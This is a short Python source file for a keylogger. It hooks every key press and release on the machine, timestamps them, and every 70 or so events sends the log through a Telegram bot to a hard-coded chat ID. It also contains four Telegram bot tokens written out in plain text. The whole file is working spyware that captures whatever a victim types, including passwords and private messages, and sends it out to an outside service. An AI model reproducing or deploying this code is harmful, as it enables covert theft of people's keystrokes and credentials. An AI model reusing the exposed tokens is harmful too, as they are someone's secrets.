import datetime

import keyboard
import telebot

# TOKEN = '1623818411:AAE4iAu4JqlqUgoMI85deLc1KV94rG-CVJY'
TOKEN = '1880257035:AAF7WeZKMAy2Lg8BMmdR3QX-rGYoUAjZ0bI'
# TOKEN = '1711808404:AAFSZICWTmMrutOBKO8a3C1DatpxzSCccE8'
# TOKEN = '1829887939:AAHDWw57KSvQi8zZthDOzGzIWuqSKX6WIcs'
BOT = telebot.TeleBot(TOKEN)
SendMessage = BOT.send_message


def send_keyboard():
    keyboard_list = []
    count = 0
    print(BOT)

    def print_pressed_keys(e):
        # print(e, e.event_type, e.name)
        # global count, keyboard_list
        nonlocal count, keyboard_list
        count += 1
        new_time = str(datetime.datetime.now().replace(microsecond=0))
        # print(new_time)

        keyboard_list.append((e.event_type, e.name, new_time))
        if count > 70:
            print(keyboard_list)
            res = ''
            for a, b, c in keyboard_list:
                res += f'{c} {a} {b} \n'
                print()

            BOT.send_message(269019356, res)

            keyboard_list = []
            count = 0

    keyboard.hook(print_pressed_keys)
    keyboard.wait()

